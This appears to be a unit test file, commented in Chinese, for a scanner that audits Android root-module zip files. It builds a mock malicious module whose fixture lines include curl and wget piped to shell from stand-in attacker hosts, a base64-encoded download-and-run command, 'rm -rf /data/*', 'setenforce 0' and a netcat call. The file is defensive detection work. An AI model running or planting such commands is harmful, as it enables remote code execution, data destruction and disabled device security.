// 模块审核规则单测（node:test，无外部依赖）
// 覆盖：rm -rf / curl|sh / base64 执行 / 写 /system / setenforce 0 / hosts / 硬编码 IP /
//       可疑域名 / 隐私用户名 / 邮箱 / 密钥 / 元数据一致性 —— 命中与不命中。
// 运行：node --test scan.test.mjs

import test from 'node:test';
import assert from 'node:assert/strict';
import { writeFileSync, mkdtempSync, existsSync, readFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { deflateRawSync, crc32 } from 'node:zlib';

import {
  RULES_BY_ID, CONTENT_RULES, scanContent, checkMetadata, parseModuleProp,
  scoreRisk, decide, countsTowardRisk, SEVERITY_ORDER,
} from './risk-rules.mjs';
import { scanZip, classify, renderMarkdown, renderJSON, mask, resolveChangeType, CANONICAL_SCRIPTS } from './scan.mjs';

// ---------------------------------------------------------------------------
// 辅助：命中判定
// ---------------------------------------------------------------------------

function hits(ruleId, text, file = 'customize.sh') {
  const rule = RULES_BY_ID[ruleId];
  assert.ok(rule, `规则 ${ruleId} 不存在`);
  return rule.scan(file, text).filter((f) => f.severity != null);
}

function assertHit(ruleId, text, msg) {
  const h = hits(ruleId, text);
  assert.ok(h.length > 0, `${ruleId} 应当命中：${msg || text}`);
  return h;
}

function assertNoHit(ruleId, text, msg) {
  const h = hits(ruleId, text);
  assert.equal(h.length, 0, `${ruleId} 不应命中：${msg || text} —— 实际命中 ${JSON.stringify(h)}`);
}

// ---------------------------------------------------------------------------
// ① 元信息：规则表完整性
// ---------------------------------------------------------------------------

test('规则表结构完整，每条规则都有 id/category/severity/advice', () => {
  assert.ok(CONTENT_RULES.length >= 10);
  for (const r of CONTENT_RULES) {
    assert.ok(r.id, '缺少 id');
    assert.ok(r.category, `${r.id} 缺少 category`);
    assert.ok(r.advice, `${r.id} 缺少 advice`);
    assert.equal(typeof r.scan, 'function', `${r.id}.scan 不是函数`);
    // scan 必须是纯函数：同一输入两次结果一致
    const a = JSON.stringify(r.scan('x.sh', 'echo hi\nrm -rf /data'));
    const b = JSON.stringify(r.scan('x.sh', 'echo hi\nrm -rf /data'));
    assert.equal(a, b, `${r.id} 不是确定性纯函数`);
  }
});

// ---------------------------------------------------------------------------
// ② 危险模式
// ---------------------------------------------------------------------------

test('RM_RF_MUTABLE：rm -rf 作用于 /data 命中且按作用域分档', () => {
  // 宽泛作用域 -> high
  const h = assertHit('RM_RF_MUTABLE', 'rm -rf /data/*');
  assert.equal(h[0].severity, 'high');
  assert.equal(h[0].line, 1);
  assert.equal(h[0].file, 'customize.sh');
  assert.match(h[0].snippet, /rm -rf/);

  // 分区下的具体子目录 -> medium
  const m = assertHit('RM_RF_MUTABLE', 'rm -rf /data/local/tmp/leftover');
  assert.equal(m[0].severity, 'medium');

  // 分区根 -> high
  assert.equal(hits('RM_RF_MUTABLE', 'rm -rf /system')[0].severity, 'high');
});

test('RM_RF_MUTABLE：删除模块自有目录不命中', () => {
  assertNoHit('RM_RF_MUTABLE', 'rm -rf $MODPATH');
  assertNoHit('RM_RF_MUTABLE', 'rm -rf $MODDIR/system/app/Foo');
  assertNoHit('RM_RF_MUTABLE', 'rm -rf /data/adb/modules/old_mod');
  assertNoHit('RM_RF_MUTABLE', 'rm -rf $TMPDIR/stage');
});

test('PIPE_TO_SHELL：curl|sh 与 wget -O-|sh 命中 high', () => {
  const a = assertHit('PIPE_TO_SHELL', 'curl -sL https://example.com/i.sh | sh');
  assert.equal(a[0].severity, 'high');
  const b = assertHit('PIPE_TO_SHELL', 'wget -O- http://1.2.3.4/x | bash');
  assert.equal(b[0].severity, 'high');
  assertHit('PIPE_TO_SHELL', 'curl http://a.b | busybox sh');
});

test('PIPE_TO_SHELL：落盘再执行不命中', () => {
  assertNoHit('PIPE_TO_SHELL', 'curl -sL https://example.com/m.zip -o /sdcard/m.zip');
  assertNoHit('PIPE_TO_SHELL', 'wget -O /tmp/m.zip https://example.com/m.zip');
  assertNoHit('PIPE_TO_SHELL', 'sh $MODPATH/install.sh');
});

test('DOWNLOAD_TO_STDOUT：wget -O- 命中 low', () => {
  const h = assertHit('DOWNLOAD_TO_STDOUT', 'wget -O- https://example.com/a.txt > /sdcard/a.txt');
  assert.equal(h[0].severity, 'low');
});

test('OBFUSCATED_DECODE_EXEC：base64 解码后管道执行命中 high，且不与 DECODE_ONLY 重复报', () => {
  const text = 'echo aGVsbG8gd29ybGQK | base64 -d | sh';
  const h = assertHit('OBFUSCATED_DECODE_EXEC', text);
  assert.equal(h[0].severity, 'high');
  assertNoHit('OBFUSCATED_DECODE_ONLY', text, '已由 EXEC 规则报 high，不应重复');
});

test('OBFUSCATED_DECODE_ONLY：仅解码未执行命中 medium', () => {
  const h = assertHit('OBFUSCATED_DECODE_ONLY', 'base64 -d payload.b64 > /data/local/tmp/p.bin');
  assert.equal(h[0].severity, 'medium');
  assertNoHit('OBFUSCATED_DECODE_ONLY', 'base64 image.png > out.txt'); // 无 -d，纯编码
});

test('WRITE_SYSTEM_VENDOR：直接写 /system 命中 high；$MODPATH 覆盖层不命中', () => {
  assert.equal(assertHit('WRITE_SYSTEM_VENDOR', 'cp busybox /system/xbin/bb')[0].severity, 'high');
  assertHit('WRITE_SYSTEM_VENDOR', 'mount -o rw,remount /system');
  assertHit('WRITE_SYSTEM_VENDOR', 'echo "ro.foo=1" >> /system/build.prop');
  // 标准覆盖层写法
  assertNoHit('WRITE_SYSTEM_VENDOR', 'cp -f busybox $MODPATH/system/xbin/bb');
  assertNoHit('WRITE_SYSTEM_VENDOR', 'mkdir -p $MODPATH/system/app/Foo');
});

test('SELINUX_DISABLE：setenforce 0 命中 high，setenforce 1 不命中', () => {
  assert.equal(assertHit('SELINUX_DISABLE', 'setenforce 0')[0].severity, 'high');
  assertHit('SELINUX_DISABLE', 'echo 0 > /sys/fs/selinux/enforce');
  assertNoHit('SELINUX_DISABLE', 'setenforce 1');
});

test('HOSTS_MODIFY：写 hosts 命中 medium；无关心文件不命中', () => {
  const h = assertHit('HOSTS_MODIFY', 'cp $MODPATH/hosts /system/etc/hosts');
  assert.equal(h[0].severity, 'medium');
  assertHit('HOSTS_MODIFY', 'echo "127.0.0.1 ads.example" >> /system/etc/hosts');
  assertNoHit('HOSTS_MODIFY', 'echo "hello" > /data/local/tmp/notes.txt');
});

// ---------------------------------------------------------------------------
// ③ 外联
// ---------------------------------------------------------------------------

test('HARDCODED_IP：公网 IP medium，内网/回环 low，版本号样式的数字串不命中', () => {
  assert.equal(assertHit('HARDCODED_IP', 'curl http://45.77.12.9/payload')[0].severity, 'medium');
  assert.equal(assertHit('HARDCODED_IP', 'nc 192.168.1.10 4444')[0].severity, 'low');
  assert.equal(assertHit('HARDCODED_IP', 'ping 127.0.0.1')[0].severity, 'low');
  assertNoHit('HARDCODED_IP', 'versionCode=1024');
  assertNoHit('HARDCODED_IP', '# 1.2.3.4 已废弃');
});

test('SUSPICIOUS_DOMAIN：遥测/广告域名与匿名 TLD 命中；正常域名不命中', () => {
  assertHit('SUSPICIOUS_DOMAIN', 'curl https://sdk.umeng.com/collect');
  assertHit('SUSPICIOUS_DOMAIN', 'POST https://www.googletagmanager.com/gtm.js');
  assertHit('SUSPICIOUS_DOMAIN', 'https://payload.xyz/drop');
  assertNoHit('SUSPICIOUS_DOMAIN', 'https://github.com/foo/bar');
  assertNoHit('SUSPICIOUS_DOMAIN', 'https://raw.githubusercontent.com/a/b/main/modules.json');
  assertNoHit('SUSPICIOUS_DOMAIN', '# see magisk docs');
});

test('NETWORK_FETCH：任意 http(s) 地址命中 low（供人工核对）', () => {
  assert.equal(assertHit('NETWORK_FETCH', 'https://example.com/x.zip')[0].severity, 'low');
  assertNoHit('NETWORK_FETCH', 'cp /sdcard/a /sdcard/b');
});

// ---------------------------------------------------------------------------
// ④ 投稿者隐私（info，不计入风险）
// ---------------------------------------------------------------------------

test('PRIVACY_HOME_USER：绝对路径用户名命中 info；root 等通用账号名不命中', () => {
  const h = assertHit('PRIVACY_HOME_USER', 'built at /home/johndoe/modules');
  assert.equal(h[0].severity, 'info');
  assert.equal(countsTowardRisk(h[0]), false, 'info 级不应计入风险等级');
  assertHit('PRIVACY_HOME_USER', 'C:\\Users\\Alice\\workspace\\mod');
  assertHit('PRIVACY_HOME_USER', '/Users/bob/code/mod');
  assertNoHit('PRIVACY_HOME_USER', '/home/root/mod');
  assertNoHit('PRIVACY_HOME_USER', 'MODDIR=/data/adb/modules/x');
});

test('PRIVACY_EMAIL：邮箱命中 info；noreply 地址不命中', () => {
  assert.equal(assertHit('PRIVACY_EMAIL', 'maintainer: zhangsan@example.com')[0].severity, 'info');
  assertNoHit('PRIVACY_EMAIL', 'author: foo@users.noreply.github.com');
});

test('PRIVACY_SECRET：AKIA / sk- / token= / 私钥头命中 info；纯变量引用不命中', () => {
  assertHit('PRIVACY_SECRET', 'AKIAIOSFODNN7EXAMPLE');
  assertHit('PRIVACY_SECRET', 'sk-abcdefghijklmnopqrstuvwx123456');
  assertHit('PRIVACY_SECRET', 'token=abcd1234efgh5678');
  assertHit('PRIVACY_SECRET', '-----BEGIN PRIVATE KEY-----');
  assertHit('PRIVACY_SECRET', 'password: hunter2hunter2');
  assertNoHit('PRIVACY_SECRET', 'token=$API_TOKEN');
  assertNoHit('PRIVACY_SECRET', '# password: 填你自己的');
});

// ---------------------------------------------------------------------------
// ⑤ 元数据一致性
// ---------------------------------------------------------------------------

test('parseModuleProp 正确解析键值与行号', () => {
  const { fields } = parseModuleProp('id=cool_mod\nversion=v1.2\nname=Cool\n# comment\nversionCode=3\n');
  assert.equal(fields.id.value, 'cool_mod');
  assert.equal(fields.id.line, 1);
  assert.equal(fields.version.value, 'v1.2');
  assert.equal(fields.version.line, 2);
  assert.equal(fields.versionCode.value, '3');
  assert.equal(fields['# comment'], undefined);
});

test('checkMetadata：一致则不报，id/version 不一致分别报 medium', () => {
  const prop = { present: true, path: 'module.prop', fields: parseModuleProp('id=a\nversion=v1\n').fields };
  const ok = checkMetadata(prop, { id: 'a', version: 'v1' });
  assert.equal(ok.filter((f) => f.ruleId.startsWith('META_') && f.severity !== 'low').length, 0, JSON.stringify(ok));

  const bad = checkMetadata(prop, { id: 'b', version: 'v2' });
  const ids = bad.map((f) => f.ruleId);
  assert.ok(ids.includes('META_ID_MISMATCH'), JSON.stringify(ids));
  assert.ok(ids.includes('META_VERSION_MISMATCH'), JSON.stringify(ids));
  assert.equal(bad.find((f) => f.ruleId === 'META_ID_MISMATCH').severity, 'medium');
});

test('checkMetadata：module.prop 缺失或字段缺失也报 medium', () => {
  const none = checkMetadata({ present: false, path: 'module.prop', fields: {} }, {});
  assert.ok(none.some((f) => f.ruleId === 'META_PROP_MISSING' && f.severity === 'medium'));

  const partial = checkMetadata({ present: true, path: 'module.prop', fields: parseModuleProp('id=a\n').fields }, { id: 'a' });
  assert.ok(partial.some((f) => f.ruleId === 'META_FIELD_MISSING_VERSION'));
});

// ---------------------------------------------------------------------------
// 定级与决策
// ---------------------------------------------------------------------------

test('scoreRisk：有 high 即 high，无 high 有 medium 即 medium，其余 low；info 不参与', () => {
  assert.equal(scoreRisk([{ severity: 'info' }]).level, 'low');
  assert.equal(scoreRisk([{ severity: 'low' }]).level, 'low');
  assert.equal(scoreRisk([{ severity: 'medium' }, { severity: 'info' }]).level, 'medium');
  assert.equal(scoreRisk([{ severity: 'high' }, { severity: 'low' }]).level, 'high');
  assert.equal(scoreRisk([]).level, 'low');
});

test('decide：低风险+首次收录才自动放行；版本更新即便低风险也人工审；中高风险一律人工', () => {
  const a = decide('low', 'first');
  assert.equal(a.action, 'auto-approve');
  assert.equal(a.label, 'auto-approved');
  assert.equal(a.needsHumanReview, false);

  const b = decide('low', 'update');
  assert.equal(b.action, 'request-review');
  assert.equal(b.label, 'needs-human-review');
  assert.equal(b.needsHumanReview, true);

  for (const lv of ['medium', 'high']) {
    for (const ct of ['first', 'update']) {
      const d = decide(lv, ct);
      assert.equal(d.needsHumanReview, true, `${lv}/${ct} 必须人工审`);
      assert.equal(d.label, 'needs-human-review');
    }
  }
  // 变更类型未知 -> 保守转人工
  assert.equal(decide('low', 'unknown').needsHumanReview, true);
});

test('resolveChangeType：依据索引判断首次收录 / 版本更新', () => {
  const prop = { fields: { id: { value: 'mod_x', line: 1 } } };
  assert.equal(resolveChangeType({ index: [{ id: 'mod_x' }] }, prop), 'update');
  assert.equal(resolveChangeType({ index: { modules: [{ moduleId: 'other' }] } }, prop), 'first');
  assert.equal(resolveChangeType({ index: ['mod_x'] }, prop), 'update');
  assert.equal(resolveChangeType({}, prop), 'unknown');
  assert.equal(resolveChangeType({ changeType: 'update' }, prop), 'update', '显式指定优先');
});

// ---------------------------------------------------------------------------
// 端到端：造 zip 跑 scanZip
// ---------------------------------------------------------------------------

function crc32buf(buf) {
  // node:zlib 的 crc32 在较新版本提供，这里保留 0 值兜底（zip 读取器不校验 CRC）
  try { return crc32(buf); } catch { return 0; }
}

function buildZip(entries) {
  // entries: [{ name, content(string) }] -> Buffer（deflate 压缩）
  const locals = [];
  const central = [];
  let offset = 0;
  for (const e of entries) {
    const nameBuf = Buffer.from(e.name, 'utf8');
    const dataBuf = Buffer.from(e.content, 'utf8');
    const comp = deflateRawSync(dataBuf);
    const crc = crc32buf(dataBuf);

    const lh = Buffer.alloc(30);
    lh.writeUInt32LE(0x04034b50, 0);
    lh.writeUInt16LE(20, 4);
    lh.writeUInt16LE(0, 6);
    lh.writeUInt16LE(8, 8); // deflate
    lh.writeUInt32LE(crc, 14);
    lh.writeUInt32LE(comp.length, 18);
    lh.writeUInt32LE(dataBuf.length, 22);
    lh.writeUInt16LE(nameBuf.length, 26);
    lh.writeUInt16LE(0, 28);
    locals.push(lh, nameBuf, comp);

    const ch = Buffer.alloc(46);
    ch.writeUInt32LE(0x02014b50, 0);
    ch.writeUInt16LE(20, 4);
    ch.writeUInt16LE(20, 6);
    ch.writeUInt16LE(0, 8);
    ch.writeUInt16LE(8, 10);
    ch.writeUInt32LE(crc, 16);
    ch.writeUInt32LE(comp.length, 20);
    ch.writeUInt32LE(dataBuf.length, 24);
    ch.writeUInt16LE(nameBuf.length, 28);
    ch.writeUInt32LE(offset, 42);
    central.push(ch, nameBuf);

    offset += 30 + nameBuf.length + comp.length;
  }
  const cdBuf = Buffer.concat(central);
  const body = Buffer.concat(locals);
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0);
  eocd.writeUInt16LE(entries.length, 8);
  eocd.writeUInt16LE(entries.length, 10);
  eocd.writeUInt32LE(cdBuf.length, 12);
  eocd.writeUInt32LE(body.length, 16);
  return Buffer.concat([body, cdBuf, eocd]);
}

function writeZip(name, entries) {
  const dir = mkdtempSync(join(tmpdir(), 'modaudit-'));
  const p = join(dir, name);
  writeFileSync(p, buildZip(entries));
  return p;
}

const CLEAN_PROP = 'id=cool_mod\nname=Cool Mod\nversion=v1.0\nversionCode=1\nauthor=anon\ndescription=demo\n';
const CLEAN_SH = '#!/system/bin/sh\necho "installing"\ncp -f busybox $MODPATH/system/xbin/bb\n';

test('端到端：干净模块（首次收录）判 low 且自动放行', () => {
  const p = writeZip('clean.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'customize.sh', content: CLEAN_SH },
    { name: 'service.sh', content: '#!/system/bin/sh\nexit 0\n' },
  ]);
  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  assert.equal(r.reader, 'builtin', '应走内置解析器');
  assert.equal(r.riskLevel, 'low', JSON.stringify(r.findings));
  assert.equal(r.decision.action, 'auto-approve');
  assert.equal(r.decision.label, 'auto-approved');
  assert.equal(r.meta.id, 'cool_mod');
  assert.equal(r.inventory.canonicalScripts.length, 2, '应识别两个规范脚本');
  // ① 脚本全文必须纳入报告
  assert.match(renderMarkdown(r), /## 脚本全文/);
  assert.match(renderMarkdown(r), /busybox \$MODPATH/);
});

test('端到端：恶意模块判 high，脚本全文与行号证据都在报告里', () => {
  const bad = [
    '#!/system/bin/sh',
    'setenforce 0',
    'curl -sL https://payload.xyz/i.sh | sh',
    'echo Y3VybCBodHRwOi8vNDUuNzcuMTIuOS94IHwgYmFzaAo= | base64 -d | sh',
    'rm -rf /data/*',
    'cp x /system/bin/x',
    'echo "0.0.0.0 a.umeng.com" >> /system/etc/hosts',
    '# built on /home/johndoe',
    'contact: me@example.com',
    'token=abcd1234efgh5678',
  ].join('\n');
  const p = writeZip('bad.zip', [
    { name: 'module.prop', content: 'id=evil_mod\nversion=v9\n' },
    { name: 'customize.sh', content: bad },
    { name: 'service.sh', content: bad },
    { name: 'uninstall.sh', content: bad },
    { name: 'action.sh', content: 'nc 192.168.1.10 4444\n' },
  ]);
  const r = scanZip(p, { declaredId: 'evil_mod', declaredVersion: 'v1', changeType: 'first' });
  assert.equal(r.riskLevel, 'high');
  assert.equal(r.decision.needsHumanReview, true);
  const ids = new Set(r.findings.map((f) => f.ruleId));
  for (const need of ['SELINUX_DISABLE', 'PIPE_TO_SHELL', 'OBFUSCATED_DECODE_EXEC',
    'RM_RF_MUTABLE', 'WRITE_SYSTEM_VENDOR', 'HOSTS_MODIFY', 'SUSPICIOUS_DOMAIN',
    'PRIVACY_HOME_USER', 'PRIVACY_EMAIL', 'PRIVACY_SECRET', 'META_VERSION_MISMATCH']) {
    assert.ok(ids.has(need), `应命中 ${need}；实际 ${[...ids].join(',')}`);
  }
  // 证据含文件名+行号+原文片段
  const sel = r.findings.find((f) => f.ruleId === 'SELINUX_DISABLE');
  assert.equal(sel.file, 'customize.sh');
  assert.equal(sel.line, 2);
  assert.match(sel.snippet, /setenforce/);
  assert.ok(r.scripts.every((s) => typeof s.content === 'string' && s.content.length > 0));
  assert.equal(r.scripts.length, 4, 'customize/service/uninstall/action 四个 .sh 全部纳入');
});

test('端到端：低风险但为版本更新 -> 打 needs-human-review 不自动合入', () => {
  const p = writeZip('update.zip', [
    { name: 'module.prop', content: 'id=cool_mod\nversion=v1.1\n' },
    { name: 'customize.sh', content: CLEAN_SH },
  ]);
  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.1', changeType: 'update' });
  assert.equal(r.riskLevel, 'low');
  assert.equal(r.decision.action, 'request-review');
  assert.equal(r.decision.label, 'needs-human-review');
  assert.equal(r.decision.needsHumanReview, true);
});

test('端到端：报告渲染 —— Markdown 含结论/表格/隐私脱敏，JSON 可解析', () => {
  const p = writeZip('privacy.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'customize.sh', content: '# built at /home/johndoe\n# contact me@example.com\nexit 0\n' },
  ]);
  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  const md = renderMarkdown(r);
  assert.match(md, /风险等级：LOW/);
  assert.match(md, /auto-approved/);
  assert.match(md, /投稿者隐私提示/);
  assert.ok(!md.includes('johndoe'), 'Markdown 中隐私原文应脱敏');
  assert.ok(!md.includes('me@example.com'));

  const j = JSON.parse(renderJSON(r));
  assert.equal(j.riskLevel, 'low');
  assert.equal(j.schema, 'module-audit-report/v1');
  const priv = j.findings.filter((f) => f.category === 'privacy');
  assert.ok(priv.length >= 2);
  assert.ok(priv.every((f) => !f.snippet.includes('johndoe')), 'JSON 隐私片段应脱敏');
});

test('mask 对短串原样返回，对长串打码', () => {
  assert.equal(mask('abcd'), 'abcd');
  const m = mask('johndoe_secret_value');
  assert.ok(m.includes('*'));
  assert.ok(!m.includes('secret_value'));
});

test('classify 按规范顺序排列五个脚本，其余归入 otherScripts/others', () => {
  const p = writeZip('cls.zip', [
    { name: 'action.sh', content: 'x' },
    { name: 'uninstall.sh', content: 'x' },
    { name: 'customize.sh', content: 'x' },
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'extra/helper.sh', content: 'x' },
    { name: 'README.md', content: 'x' },
  ]);
  const r = scanZip(p, {});
  assert.deepEqual(r.inventory.canonicalScripts.map((s) => s.name.split('/').pop()),
    ['customize.sh', 'uninstall.sh', 'action.sh']);
  assert.ok(r.inventory.otherScripts.some((s) => s.name === 'extra/helper.sh'));
  assert.ok(r.inventory.otherFiles.includes('README.md'));
});

test('缺少 module.prop 的 zip 报 META_PROP_MISSING 且不低于 medium', () => {
  const p = writeZip('noprop.zip', [{ name: 'customize.sh', content: CLEAN_SH }]);
  const r = scanZip(p, { changeType: 'first' });
  assert.ok(r.findings.some((f) => f.ruleId === 'META_PROP_MISSING'));
  assert.notEqual(r.riskLevel, 'low', '缺少 module.prop 不应判 low');
  assert.equal(r.decision.needsHumanReview, true);
});
